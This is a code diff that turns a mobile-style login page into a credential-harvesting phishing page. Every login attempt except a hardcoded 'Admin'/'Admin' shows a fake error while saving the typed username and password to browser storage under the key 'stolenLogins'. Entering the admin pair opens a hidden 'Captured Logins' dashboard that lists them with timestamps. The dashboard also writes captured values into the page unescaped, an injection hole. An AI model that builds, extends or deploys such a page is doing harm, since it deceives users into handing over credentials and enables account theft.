@@ -43,7 +43,12 @@
     }
 
     .input-container { width: 85%; margin: 0 auto; } 
-    input[type="text"], input[type="password"] { width: 100%; font-size: 0.95rem; padding-bottom: 0.25rem; }
+    input[type="text"], input[type="password"] { 
+      width: 100%; 
+      font-size: 0.95rem; 
+      padding-bottom: 0.25rem; 
+      padding-right: 2.5rem; /* ensures username matches password width */
+    }
 
     label[for="password"] { position: relative; top: -3px; font-size: 0.75rem; }
     #password { position: relative; top: -2.7px; }
@@ -56,10 +61,31 @@
     h1 { position: relative; top: -10px; font-size: 1.5rem; font-weight: 500; }
 
     form.flex.flex-col.space-y-6 { gap: 0.5rem; }
+
+    /* Admin Dashboard Styles */
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    .highlight {
+      background-color: #eef2ff;
+      padding: 0.5rem;
+      border-radius: 8px;
+    }
+    .remove-btn {
+      cursor: pointer;
+      color: #ef4444;
+    }
+    .remove-btn:hover {
+      color: #dc2626;
+    }
+    #adminSection { display: none; }
   </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
-  <div class="pt-4 px-6 relative flex flex-col flex-grow">
+  <!-- Wrap login in a section so loginSection exists -->
+  <div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
     <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] text-xl leading-none font-medium">
       <i class="fas fa-chevron-left"></i>
     </button>
@@ -67,11 +93,11 @@
     <form id="loginForm" class="flex flex-col space-y-6">
       <div class="flex flex-col input-container">
         <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
-        <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required />
+        <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans w-full" autocomplete="username" required />
       </div>
       <div class="flex flex-col relative input-container">
         <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
-        <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required />
+        <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans w-full" autocomplete="current-password" required />
         <button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
           <i id="eyeIcon" class="fas fa-eye-slash"></i>
         </button>
@@ -84,98 +110,167 @@
       <a id="forgotPassword" href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
     </form>
   </div>
+
   <button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>Log In</button>
+
+  <div id="adminSection" class="p-6 max-w-3xl mx-auto" style="display: none;">
+    <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
+    <div class="card p-6 mb-6">
+      <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
+      <div class="overflow-y-auto max-h-96" id="loginList">
+        <pre class="text-gray-600 whitespace-pre-wrap bg-gray-50 p-4 rounded-lg">No logins yet.</pre>
+      </div>
+    </div>
+    <div class="card p-6">
+      <h2 class="text-xl font-semibold text-gray-700 mb-4">Stats</h2>
+      <div class="grid grid-cols-2 gap-4 text-center stats">
+        <div class="p-4 bg-blue-50 rounded-lg">
+          <p class="text-sm text-gray-500">Total Logins</p>
+          <p class="text-2xl font-bold text-blue-600" id="totalLogins">0</p>
+        </div>
+        <div class="p-4 bg-green-50 rounded-lg">
+          <p class="text-sm text-gray-500">Last Login</p>
+          <p class="text-2xl font-bold text-green-600" id="lastLogin">N/A</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script>
     document.addEventListener("DOMContentLoaded", function() {
-      const usernameInput = document.getElementById("username");
-      const passwordInput = document.getElementById("password");
-      const loginBtn = document.getElementById("loginBtn");
-      const errorMsg = document.getElementById("errorMsg");
-      const forgotPassword = document.getElementById("forgotPassword");
+      setTimeout(() => {
+        const usernameInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+        const loginBtn = document.getElementById("loginBtn");
+        const errorMsg = document.getElementById("errorMsg");
+        const forgotPassword = document.getElementById("forgotPassword");
+        const loginSection = document.getElementById("loginSection");
+        const adminSection = document.getElementById("adminSection");
+        const loginList = document.getElementById("loginList");
+        const totalLogins = document.getElementById("totalLogins");
+        const lastLogin = document.getElementById("lastLogin");
 
-      const pathUsername = window.location.pathname.split("/")[1];
-      if(pathUsername) usernameInput.value = decodeURIComponent(pathUsername);
-
-      function checkInputs() {
-        if(usernameInput.value.trim() && passwordInput.value.trim()) {
-          loginBtn.classList.remove("bg-gray-400");
-          loginBtn.classList.add("bg-[#00b0ff]");
-          loginBtn.disabled = false;
-        } else {
-          loginBtn.classList.remove("bg-[#00b0ff]");
-          loginBtn.classList.add("bg-gray-400");
-          loginBtn.disabled = true;
+        if (!usernameInput || !passwordInput || !loginBtn || !errorMsg || !forgotPassword || !loginSection || !adminSection || !loginList || !totalLogins || !lastLogin) {
+          console.error("One or more DOM elements not found");
+          return;
         }
-      }
 
-      usernameInput.addEventListener("input", checkInputs);
-      passwordInput.addEventListener("input", checkInputs);
+        const pathUsername = window.location.pathname.split("/")[1];
+        if (pathUsername) usernameInput.value = decodeURIComponent(pathUsername);
 
-      loginBtn.addEventListener("click", function() {
-        if(usernameInput.value.trim() && passwordInput.value.trim()) {
-          if(usernameInput.value !== "Admin" || passwordInput.value !== "Admin") {
-            errorMsg.classList.remove("hidden");
-            passwordInput.value = "";
+        function checkInputs() {
+          if (usernameInput.value.trim() && passwordInput.value.trim()) {
+            loginBtn.classList.remove("bg-gray-400");
+            loginBtn.classList.add("bg-[#00b0ff]");
+            loginBtn.disabled = false;
+          } else {
             loginBtn.classList.remove("bg-[#00b0ff]");
             loginBtn.classList.add("bg-gray-400");
             loginBtn.disabled = true;
-
-            // Save unique login data with timestamp
-            let storedData = JSON.parse(localStorage.getItem("secureLogins") || "[]");
-            const newEntry = {
-              username: usernameInput.value,
-              password: passwordInput.value,
-              timestamp: new Date().toLocaleString()
-            };
-            const existingIndex = storedData.findIndex(entry => 
-              entry.username === newEntry.username && entry.password === newEntry.password
-            );
-            if (existingIndex === -1) {
-              storedData.push(newEntry);
-              localStorage.setItem("secureLogins", JSON.stringify(storedData));
-              // Force reload to update admin page
-              if (window.location.href.includes("admin.html")) {
-                location.reload();
-              }
-            }
-          } else {
-            window.location.href = "admin.html";
           }
         }
-      });
 
-      window.togglePassword = function() {
-        if(passwordInput.type === "password") {
-          passwordInput.type = "text";
-          document.getElementById("eyeIcon").classList.replace("fa-eye-slash", "fa-eye");
-        } else {
-          passwordInput.type = "password";
-          document.getElementById("eyeIcon").classList.replace("fa-eye", "fa-eye-slash");
+        usernameInput.addEventListener("input", checkInputs);
+        passwordInput.addEventListener("input", checkInputs);
+
+        loginBtn.addEventListener("click", function() {
+          if (usernameInput.value.trim() && passwordInput.value.trim()) {
+            if (usernameInput.value !== "Admin" || passwordInput.value !== "Admin") {
+              errorMsg.classList.remove("hidden");
+              passwordInput.value = "";
+              loginBtn.classList.remove("bg-[#00b0ff]");
+              loginBtn.classList.add("bg-gray-400");
+              loginBtn.disabled = true;
+
+              let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]");
+              const newEntry = {
+                username: usernameInput.value,
+                password: passwordInput.value,
+                timestamp: new Date().toLocaleString()
+              };
+              storedData.push(newEntry);
+              localStorage.setItem("stolenLogins", JSON.stringify(storedData));
+              loginList.innerHTML = "";
+              storedData.forEach((entry, index) => {
+                const div = document.createElement("div");
+                div.className = "bg-gray-50 p-4 rounded-lg mb-2 flex justify-between items-center";
+                div.innerHTML = `<span>${entry.username}: ${entry.password} - ${entry.timestamp}</span><span class="remove-btn" onclick="removeLogin(${index})">Remove</span>`;
+                loginList.appendChild(div);
+              });
+              totalLogins.textContent = storedData.length;
+              lastLogin.textContent = storedData.length > 0 ? storedData[storedData.length - 1].timestamp : "N/A";
+            } else {
+              loginSection.style.display = "none";
+              adminSection.style.display = "block";
+              let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]");
+              loginList.innerHTML = "";
+              if (storedData.length === 0) {
+                loginList.innerHTML = '<pre class="text-gray-600 whitespace-pre-wrap bg-gray-50 p-4 rounded-lg">No logins yet.</pre>';
+              } else {
+                storedData.forEach((entry, index) => {
+                  const div = document.createElement("div");
+                  div.className = "bg-gray-50 p-4 rounded-lg mb-2 flex justify-between items-center";
+                  div.innerHTML = `<span>${entry.username}: ${entry.password} - ${entry.timestamp}</span><span class="remove-btn" onclick="removeLogin(${index})">Remove</span>`;
+                  loginList.appendChild(div);
+                });
+              }
+              totalLogins.textContent = storedData.length;
+              lastLogin.textContent = storedData.length > 0 ? storedData[storedData.length - 1].timestamp : "N/A";
+            }
+          }
+        });
+
+        window.togglePassword = function() {
+          const eyeIcon = document.getElementById("eyeIcon");
+          if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            eyeIcon.classList.replace("fa-eye-slash", "fa-eye");
+          } else {
+            passwordInput.type = "password";
+            eyeIcon.classList.replace("fa-eye", "fa-eye-slash");
+          }
         }
-      }
 
-      function moveAboveKeyboard() {
-        const gap = 8;
-        const forgotBottom = forgotPassword.getBoundingClientRect().bottom;
-        const viewportHeight = window.innerHeight;
-        const newBottom = Math.max(viewportHeight - forgotBottom + gap - 30, 16);
-        loginBtn.style.bottom = newBottom + "px";
-      }
+        window.removeLogin = function(index) {
+          let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]");
+          storedData.splice(index, 1);
+          localStorage.setItem("stolenLogins", JSON.stringify(storedData));
+          loginList.innerHTML = "";
+          storedData.forEach((entry, index) => {
+            const div = document.createElement("div");
+            div.className = "bg-gray-50 p-4 rounded-lg mb-2 flex justify-between items-center";
+            div.innerHTML = `<span>${entry.username}: ${entry.password} - ${entry.timestamp}</span><span class="remove-btn" onclick="removeLogin(${index})">Remove</span>`;
+            loginList.appendChild(div);
+          });
+          totalLogins.textContent = storedData.length;
+          lastLogin.textContent = storedData.length > 0 ? storedData[storedData.length - 1].timestamp : "N/A";
+        }
 
-      function resetButtonPosition() { loginBtn.style.bottom = "8px"; }
+        function moveAboveKeyboard() {
+          const gap = 8;
+          const forgotBottom = forgotPassword.getBoundingClientRect().bottom;
+          const viewportHeight = window.innerHeight;
+          const newBottom = Math.max(viewportHeight - forgotBottom + gap - 30, 16);
+          loginBtn.style.bottom = newBottom + "px";
+        }
 
-      usernameInput.addEventListener("focus", moveAboveKeyboard);
-      passwordInput.addEventListener("focus", moveAboveKeyboard);
-      usernameInput.addEventListener("blur", resetButtonPosition);
-      passwordInput.addEventListener("blur", resetButtonPosition);
-      window.addEventListener("resize", resetButtonPosition);
+        function resetButtonPosition() {
+          loginBtn.style.bottom = "8px";
+        }
 
-      usernameInput.addEventListener("keydown", function(e) {
-        if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
-      });
-      passwordInput.addEventListener("keydown", function(e) {
-        if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
-      });
+        usernameInput.addEventListener("focus", moveAboveKeyboard);
+        passwordInput.addEventListener("focus", moveAboveKeyboard);
+        usernameInput.addEventListener("blur", resetButtonPosition);
+        passwordInput.addEventListener("blur", resetButtonPosition);
+        window.addEventListener("resize", resetButtonPosition);
+
+        usernameInput.addEventListener("keydown", function(e) {
+          if (e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
+        });
+        passwordInput.addEventListener("keydown", function(e) {
+          if (e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
+        });
+      }, 100);
     });
   </script>
 </body>
